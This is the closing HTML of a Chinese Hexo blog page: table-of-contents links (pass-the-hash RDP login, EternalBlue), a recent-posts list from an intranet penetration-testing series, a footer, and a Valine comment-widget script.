href="#%E5%88%A9%E7%94%A8%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E7%99%BB%E5%BD%95%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">1.9.2.</span> <span class="toc-text">利用哈希传递登录远程桌面</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#EhernalBlue%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">1.9.3.</span> <span class="toc-text">EhernalBlue永恒之蓝</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(5)/" title="内网渗透体系建设——横向移动">内网渗透体系建设——横向移动</a><time datetime="2023-04-03T16:00:00.000Z" title="发表于 2023-04-04 00:00:00">2023-04-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(4)/" title="内网渗透体系建设——权限提升">内网渗透体系建设——权限提升</a><time datetime="2023-04-01T16:00:00.000Z" title="发表于 2023-04-02 00:00:00">2023-04-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(3)/" title="内网渗透体系建设——端口转发与代理">内网渗透体系建设——端口转发与代理</a><time datetime="2023-03-29T16:00:00.000Z" title="发表于 2023-03-30 00:00:00">2023-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透体系建设——内网信息收集">内网渗透体系建设——内网信息收集</a><time datetime="2023-03-27T16:00:00.000Z" title="发表于 2023-03-28 00:00:00">2023-03-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(2)/" title="内网渗透体系建设——基础知识">内网渗透体系建设——基础知识</a><time datetime="2023-03-25T16:00:00.000Z" title="发表于 2023-03-26 00:00:00">2023-03-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By micgo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '2t5fYJ95Y61Dyi4xHc3dWgxl-gzGzoHsz',
+      appKey: 'UNfGz5zfJGeNX6LS5OyiymLm',
+      avatar: 'monsterid',
+      serverURLs: 'https://2t5fyj95.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
